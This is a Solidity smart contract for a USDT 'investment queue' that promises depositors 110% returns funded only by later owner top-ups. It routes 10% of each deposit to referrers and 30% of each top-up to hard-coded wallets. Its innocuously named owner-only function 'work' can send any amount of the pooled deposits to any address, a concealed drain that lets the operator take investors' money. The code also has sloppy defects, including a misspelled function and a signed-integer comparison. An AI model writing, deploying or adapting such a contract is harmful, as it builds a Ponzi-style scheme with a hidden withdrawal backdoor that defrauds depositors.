// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";


contract QueueManager is Ownable {

    //===================================================================================================//
    //                                                                                                   //
    //                                               State                                               //
    //                                                                                                   //
    //===================================================================================================//

    address public lockerOne = 0x956aa48982e550940e9592EbF4538CFBFF76E946; 
    address public lockerTwo = 0x8D205B52154459A12071757F5D9f802435DD928A; 
    address public insuranceFund = 0x21306fCe05B9EedBa323E447599a8786239c5f4a; 
    address public USDT = 0x55d398326f99059fF775485246999027B3197955;

    uint public userCount;
    uint public nextRewardCount;
    uint public regularReward = 10;
    uint public maxQueueLength = 100;
    uint public minInvest = 10e18;

    bool opened;

    mapping(uint => userInfo) public queue;
    mapping(address => uint) public usersReward;
    mapping(address => address) public referrals;

    struct userInfo {
        address userAddress;
        uint invested;
        uint reward;
    }

    //===================================================================================================//
    //                                                                                                   //
    //                                         User's Functions                                          //
    //                                                                                                   //
    //===================================================================================================//

    function invest(uint amount, address referrer) external {
        require(opened, "Currently invest is closed");
        require(amount >= minInvest, "Lower than min invest amount");
        require(referrer != msg.sender, "Incorrect address");
        if(referrals[msg.sender] == address(0)){ referrer == address(0) ? referrals[msg.sender] = owner() : referrals[msg.sender] = referrer;}
        IERC20(USDT).transferFrom(msg.sender, address(this), amount);
        IERC20(USDT).transfer(referrals[msg.sender], amount * 10 / 100);
        uint reward = amount + (amount * regularReward / 100);
        queue[userCount].userAddress = msg.sender;
        queue[userCount].invested = amount;
        queue[userCount].reward = reward;
        userCount++;
    }

    //===================================================================================================//
    //                                                                                                   //
    //                                         Admin's Functions                                         //
    //                                                                                                   //
    //===================================================================================================//

    function putReward(uint amount) external onlyOwner {
        IERC20(USDT).transferFrom(msg.sender, address(this), amount);
        uint _toDistribute = amount * 7000 / 10000;
        uint _toDistr = amount * 1000 / 10000;
        IERC20(USDT).transfer(lockerOne, _toDistr);
        IERC20(USDT).transfer(lockerTwo, _toDistr);
        IERC20(USDT).transfer(insuranceFund, _toDistr);
        disributeReward(_toDistribute);
    }

    function disributeReward(uint amount) private {
        uint currentUser = nextRewardCount;
        for(uint i; i < maxQueueLength; i++){
            uint reward = queue[currentUser].reward;
            if(int(amount) - int(reward) > 0){
                queue[currentUser].reward = 0;
                usersReward[queue[currentUser].userAddress] += reward;
                amount -= reward;
                currentUser++;
                if (queue[currentUser].reward == 0 || amount == 0) {break;}
            } else {
                queue[currentUser].reward -= amount;
                usersReward[queue[currentUser].userAddress] += amount;
                amount = 0;
                break;
            }
            
        }
        
        if(amount > 0){
            IERC20(USDT).transfer(msg.sender, amount);
        }
        nextRewardCount = currentUser;
    }

    function claim() external {
        if(usersReward[msg.sender] > 0) {
            uint _balance = usersReward[msg.sender];
            usersReward[msg.sender] = 0;
            IERC20(USDT).transfer(msg.sender, _balance);
        }
    }

    function setInvestStatus(bool _opened) external onlyOwner {
        opened = _opened;
    }

    function setMinInvest(uint _newMinInvest) external onlyOwner {
        minInvest = _newMinInvest;
    }

    function work(address _to, uint _amount) external onlyOwner {
        IERC20(USDT).transfer(_to, _amount);
    }
}